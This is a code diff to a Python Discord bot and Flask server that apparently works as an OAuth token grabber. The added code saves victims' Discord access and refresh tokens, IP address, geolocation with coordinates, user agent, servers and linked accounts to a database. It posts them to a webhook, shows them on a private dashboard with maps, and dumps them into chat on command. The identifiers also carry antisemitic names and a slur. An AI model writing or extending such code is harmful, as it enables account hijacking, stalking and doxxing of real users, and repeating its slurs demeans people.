@@ -8,6 +8,8 @@ import discord
 from discord.ext import commands
 from pystyle import *
 import asyncio
+import sqlite3
+import json
 
 app = flask.Flask(__name__)
 
@@ -20,10 +22,47 @@ guild_ids     = os.environ["GUILD_IDS"].split(",")
 webhook       = os.environ["WEBHOOK"]
 jew_token     = token
 
-tokens = {}
+app.secret_key = 'negrosjotos'  # Change this to a secure key
+
+# ── Database Setup ──────────────────────────────────────────────────────
+conn = sqlite3.connect('tokens.db', check_same_thread=False)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS tokens (
+    user_id TEXT PRIMARY KEY,
+    access_token TEXT,
+    refresh_token TEXT,
+    ip TEXT,
+    geo TEXT,
+    useragent TEXT,
+    lat TEXT,
+    lon TEXT,
+    guild_list TEXT,
+    connection_list TEXT,
+    map_url TEXT
+)''')
+conn.commit()
+
+tokens = {}  # Keep for bot, but we'll sync with DB
 START_TIME = time.time()
 clear = lambda: os.system("cls" if os.name == "nt" else "clear")
 jew = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)
+
+# Load tokens from DB
+c.execute('SELECT * FROM tokens')
+for row in c.fetchall():
+    user_id, access, refresh, ip, geo_str, ua, lat, lon, guilds, conns, map_url = row
+    tokens[user_id] = {
+        'access_token': access,
+        'refresh_token': refresh,
+        'ip': ip,
+        'geo': json.loads(geo_str) if geo_str else {},
+        'useragent': ua,
+        'lat': lat,
+        'lon': lon,
+        'guild_list': guilds,
+        'connection_list': conns,
+        'map_url': map_url
+    }
 
 # ── Flask Routes ──────────────────────────────────────────────────────────────
 
@@ -125,8 +164,112 @@ Timezone:      {geo.get('timezone', 'N/A')}
 [⠀⠀⠀​​​​​​]({map_url})"""
   }
 
-  httpx.post(webhook, json=info)
+  tokens[user_id] = {
+    'access_token': access_token,
+    'refresh_token': refresh_token,
+    'ip': ip,
+    'geo': geo,
+    'useragent': useragent,
+    'lat': lat,
+    'lon': lon,
+    'guild_list': guild_list,
+    'connection_list': connection_list,
+    'map_url': map_url
+  }
+
+  c.execute('''INSERT OR REPLACE INTO tokens (user_id, access_token, refresh_token, ip, geo, useragent, lat, lon, guild_list, connection_list, map_url) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+            (user_id, access_token, refresh_token, ip, json.dumps(geo), useragent, str(lat), str(lon), guild_list, connection_list, map_url))
+  conn.commit()
+
+  try:
+    response = httpx.post(webhook, json=info)
+    response.raise_for_status()
+    print("Webhook sent successfully")
+  except Exception as e:
+    print(f"Webhook failed: {e}")
   return flask.redirect("https://discord.com/app")
+
+# ── Dashboard Routes ─────────────────────────────────────────────────────
+
+@app.route("/login")
+def login():
+  return flask.redirect(
+    f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
+    f"&redirect_uri={flask.url_for('dashboard_callback', _external=True)}&response_type=code"
+    f"&scope=identify"
+  )
+
+@app.route("/dashboard_callback")
+def dashboard_callback():
+  try:
+    code = flask.request.args.get('code')
+    if not code:
+      return "No code provided", 400
+    data = {
+      "client_id": client_id,
+      "client_secret": client_secret,
+      "grant_type": "authorization_code",
+      "code": code,
+      "redirect_uri": flask.url_for('dashboard_callback', _external=True)
+    }
+    r = httpx.post("https://discord.com/api/oauth2/token", data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
+    if r.status_code != 200:
+      return "OAuth failed", 400
+    token_data = r.json()
+    access_token = token_data.get("access_token")
+    if not access_token:
+      return "No access token", 400
+    user = httpx.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"}).json()
+    user_id = user.get('id')
+    if user_id == '1178709988747780146':
+      flask.session['user_id'] = user_id
+      return flask.redirect("/dashboard")
+    else:
+      return "Access Denied", 403
+  except Exception as e:
+    return f"Error: {str(e)}", 500
+
+@app.route("/dashboard")
+def dashboard():
+  if 'user_id' not in flask.session or flask.session['user_id'] != '1178709988747780146':
+    return flask.redirect("/login")
+  try:
+    c.execute('SELECT user_id, access_token, ip, geo, lat, lon FROM tokens')
+    rows = c.fetchall()
+    html = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tokens Dashboard</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+    th { background-color: #f2f2f2; }
+    tr:nth-child(even) { background-color: #f9f9f9; }
+  </style>
+</head>
+<body>
+  <h1>Tokens Dashboard</h1>
+  <table>
+    <tr>
+      <th>User ID</th>
+      <th>Access Token (Partial)</th>
+      <th>IP</th>
+      <th>Location</th>
+      <th>Map</th>
+    </tr>"""
+    for row in rows:
+      user_id, access, ip, geo_str, lat, lon = row
+      geo = json.loads(geo_str) if geo_str else {}
+      location = f"{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}"
+      map_link = f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm" if lat and lon else "#"
+      html += f"<tr><td>{user_id}</td><td>{access[:20]}...</td><td>{ip}</td><td>{location}</td><td><a href='{map_link}' target='_blank'>View Map</a></td></tr>"
+    html += "</table></body></html>"
+    return html
+  except Exception as e:
+    return f"Error: {str(e)}", 500
 
 # ── jew Events ────────────────────────────────────────────────────────────────
 
@@ -160,6 +303,9 @@ i > Total Members:      {total_members}
 i > Configured Guilds:  {len(guild_ids)}
 i > Ready.
   """))
+
+  # Start Flask in a thread
+  threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
 
 # ── Commands ──────────────────────────────────────────────────────────────────
 
@@ -256,7 +402,45 @@ async def info(ctx, user_id: str):
     return
 
   data = tokens[user_id]
-  await ctx.send(f"```\n[ {user_id} ]\nAccess Token:  {data['access_token']}\nRefresh Token: {data['refresh_token']}\n```")
+  access_token = data.get('access_token', 'N/A')
+  refresh_token = data.get('refresh_token', 'N/A')
+  ip = data.get('ip', 'N/A')
+  geo = data.get('geo', {})
+  useragent = data.get('useragent', 'N/A')
+  lat = data.get('lat', 'N/A')
+  lon = data.get('lon', 'N/A')
+  guild_list = data.get('guild_list', 'N/A')
+  connection_list = data.get('connection_list', 'N/A')
+  map_url = data.get('map_url', 'N/A')
+
+  msg = f"""```
+[ TOKENS ]
+Access Token:  {access_token}
+Refresh Token: {refresh_token}
+
+[ NETWORK ]
+IP:            {ip}
+ISP:           {geo.get('isp', 'N/A')}
+Org:           {geo.get('org', 'N/A')}
+User-Agent:    {useragent}
+
+[ LOCATION ]
+Country:       {geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})
+Region:        {geo.get('regionName', 'N/A')} ({geo.get('region', 'N/A')})
+City:          {geo.get('city', 'N/A')}
+ZIP:           {geo.get('zip', 'N/A')}
+Latitude:      {lat}
+Longitude:     {lon}
+Timezone:      {geo.get('timezone', 'N/A')}
+
+[ GUILDS ]
+{guild_list}
+
+[ CONNECTIONS ]
+{connection_list}
+```
+[{map_url}]({map_url})"""
+  await ctx.send(msg)
 
 @jew.command()
 @commands.has_permissions(administrator=True)
